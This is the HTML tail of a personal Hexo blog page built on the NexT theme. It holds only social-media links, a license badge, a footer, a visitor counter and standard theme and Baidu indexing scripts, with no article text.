        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page â†’ https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube â†’ https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram â†’ https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2017 â€“ 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.1m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">31:08</span>
</div>
  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
